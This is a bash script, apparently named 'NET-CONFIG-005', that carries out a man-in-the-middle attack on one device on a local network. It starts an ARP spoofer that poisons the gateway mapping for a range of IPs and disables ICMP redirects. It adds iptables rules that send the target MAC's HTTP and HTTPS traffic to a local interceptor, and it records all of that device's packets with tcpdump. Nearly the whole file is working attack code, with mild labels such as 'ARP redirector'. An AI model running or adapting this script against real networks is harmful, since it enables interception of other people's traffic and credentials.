#!/usr/bin/env bash
# NET-CONFIG-005: Dual HTTP / HTTPS Interceptor & Session Runner
set -euo pipefail

IFACE="enp5s0"
TARGET_MAC="68:15:90:6b:81:96"
TARGET_IPS=($(seq -f "192.168.1.%g" 130 145))
GATEWAY_IP="192.168.1.1"
GATEWAY_MAC="14:ca:56:81:18:71"
HTTP_PORT="8080"
HTTPS_PORT="8443"
DURATION="${1:-1800}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"
CAPTURES_DIR="${REPO_DIR}/captures"
mkdir -p "${CAPTURES_DIR}"

PCAP_FILE="${CAPTURES_DIR}/net-config-005.pcap"
HTTP_LOG="${CAPTURES_DIR}/net-config-005.log"
INTERCEPTOR_STDOUT="${CAPTURES_DIR}/http_interceptor_config005.log"
ARP_LOG="${CAPTURES_DIR}/arp_spoofer_config005.log"

ORIG_REDIRECT_ALL="$(sysctl -n net.ipv4.conf.all.send_redirects)"
ORIG_REDIRECT_IF="$(sysctl -n net.ipv4.conf.${IFACE}.send_redirects)"

echo "[+] Target MAC: ${TARGET_MAC} (Tracking range .130 - .145)"
echo "[+] Gateway: ${GATEWAY_IP} (${GATEWAY_MAC})"
echo "[+] Interface: ${IFACE}"
echo "[+] Interceptor Ports: HTTP=${HTTP_PORT}, HTTPS=${HTTPS_PORT}"
echo "[+] HTTP Log File: ${HTTP_LOG}"
echo "[+] PCAP File: ${PCAP_FILE}"

CLEANED_UP=0
cleanup() {
    if [ "$CLEANED_UP" -eq 1 ]; then
        return
    fi
    CLEANED_UP=1
    echo "[*] Cleaning up session..."

    if [ -n "${HTTP_PID:-}" ] && kill -0 "${HTTP_PID}" 2>/dev/null; then
        echo "[*] Stopping HTTP/HTTPS server..."
        kill -TERM "${HTTP_PID}" 2>/dev/null || true
        wait "${HTTP_PID}" 2>/dev/null || true
    fi

    if [ -n "${ARP_PID:-}" ] && kill -0 "${ARP_PID}" 2>/dev/null; then
        echo "[*] Stopping native ARP redirector (restoring ARP tables)..."
        kill -TERM "${ARP_PID}" 2>/dev/null || true
        wait "${ARP_PID}" 2>/dev/null || true
    fi

    if [ -n "${TCPDUMP_PID:-}" ] && kill -0 "${TCPDUMP_PID}" 2>/dev/null; then
        echo "[*] Terminating tcpdump..."
        kill -TERM "${TCPDUMP_PID}" 2>/dev/null || true
        wait "${TCPDUMP_PID}" 2>/dev/null || true
    fi

    echo "[*] Removing iptables NAT redirects..."
    iptables -t nat -D PREROUTING -i "${IFACE}" -m mac --mac-source "${TARGET_MAC}" -p tcp --dport 80 -j REDIRECT --to-ports "${HTTP_PORT}" 2>/dev/null || true
    iptables -t nat -D PREROUTING -i "${IFACE}" -m mac --mac-source "${TARGET_MAC}" -p tcp --dport 443 -j REDIRECT --to-ports "${HTTPS_PORT}" 2>/dev/null || true

    echo "[*] Removing temporary FORWARD rules..."
    iptables -D FORWARD -i "${IFACE}" -o "${IFACE}" -m mac --mac-source "${TARGET_MAC}" -j ACCEPT 2>/dev/null || true
    iptables -D FORWARD -i "${IFACE}" -o "${IFACE}" -d 192.168.1.0/24 -j ACCEPT 2>/dev/null || true

    echo "[*] Restoring sysctl redirect settings..."
    sysctl -w "net.ipv4.conf.all.send_redirects=${ORIG_REDIRECT_ALL}" >/dev/null
    sysctl -w "net.ipv4.conf.${IFACE}.send_redirects=${ORIG_REDIRECT_IF}" >/dev/null

    echo "[+] Cleanup complete. Current forward rules:"
    iptables -S FORWARD
}

trap cleanup EXIT INT TERM

echo "[+] Suppressing kernel ICMP redirects..."
sysctl -w net.ipv4.conf.all.send_redirects=0 >/dev/null
sysctl -w "net.ipv4.conf.${IFACE}.send_redirects=0" >/dev/null

echo "[+] Inserting universal MAC FORWARD rules..."
iptables -I FORWARD 1 -i "${IFACE}" -o "${IFACE}" -m mac --mac-source "${TARGET_MAC}" -j ACCEPT
iptables -I FORWARD 2 -i "${IFACE}" -o "${IFACE}" -d 192.168.1.0/24 -j ACCEPT

echo "[+] Inserting port 80 & 443 NAT REDIRECT rules..."
iptables -t nat -I PREROUTING 1 -i "${IFACE}" -m mac --mac-source "${TARGET_MAC}" -p tcp --dport 80 -j REDIRECT --to-ports "${HTTP_PORT}"
iptables -t nat -I PREROUTING 2 -i "${IFACE}" -m mac --mac-source "${TARGET_MAC}" -p tcp --dport 443 -j REDIRECT --to-ports "${HTTPS_PORT}"

echo "[+] Starting dual HTTP/HTTPS interceptor..."
python3 -u "${SCRIPT_DIR}/http_interceptor.py" "${HTTP_PORT}" "${HTTP_LOG}" "${HTTPS_PORT}" > "${INTERCEPTOR_STDOUT}" 2>&1 &
HTTP_PID=$!
sleep 1

if ! kill -0 "${HTTP_PID}" 2>/dev/null; then
    echo "[-] Error: HTTP/HTTPS interceptor failed to start"
    cat "${INTERCEPTOR_STDOUT}" || true
    exit 1
fi
echo "[+] HTTP/HTTPS interceptor active (PID ${HTTP_PID})"

echo "[+] Starting tcpdump..."
tcpdump -i "${IFACE}" -s 0 -nn -U -w "${PCAP_FILE}" \
    "ether host ${TARGET_MAC}" >/dev/null 2>&1 &
TCPDUMP_PID=$!
sleep 1

if ! kill -0 "${TCPDUMP_PID}" 2>/dev/null; then
    echo "[-] Error: tcpdump failed to start"
    exit 1
fi
echo "[+] tcpdump active (PID ${TCPDUMP_PID})"

echo "[+] Starting native ARP redirector..."
TARGETS_CSV="$(IFS=,; echo "${TARGET_IPS[*]}")"
python3 "${SCRIPT_DIR}/arp_spoofer.py" "${IFACE}" "${TARGETS_CSV}" "${TARGET_MAC}" "${GATEWAY_IP}" "${GATEWAY_MAC}" > "${ARP_LOG}" 2>&1 &
ARP_PID=$!
sleep 1

if ! kill -0 "${ARP_PID}" 2>/dev/null; then
    echo "[-] Error: ARP redirector failed to start"
    cat "${ARP_LOG}" || true
    exit 1
fi
echo "[+] ARP redirector active (PID ${ARP_PID})"
echo "[+] NET-CONFIG-005 is ACTIVE. Bounded duration: ${DURATION} seconds."
echo "[+] Ready for receiver diagnostic / boot execution."

sleep "${DURATION}"
echo "[+] Bounded duration reached."
